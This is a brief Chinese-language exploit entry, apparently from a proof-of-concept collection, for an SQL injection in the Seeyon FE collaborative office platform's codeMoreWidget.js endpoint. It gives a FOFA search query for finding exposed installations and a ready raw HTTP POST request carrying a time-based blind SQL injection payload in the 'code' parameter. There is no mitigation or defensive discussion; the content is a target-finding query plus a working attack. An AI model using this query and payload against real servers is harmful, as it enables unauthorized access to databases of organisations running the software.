## 致远互联FE协作办公平台codeMoreWidget.js存在sql注入漏洞

## fofa

```
title="FE协作办公平台" || body="li_plugins_download"
```

## poc

```
POST /common/codeMoreWidget.js%70 HTTP/1.1
Host:
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

code=-1';waitfor delay '0:0:5'--
```

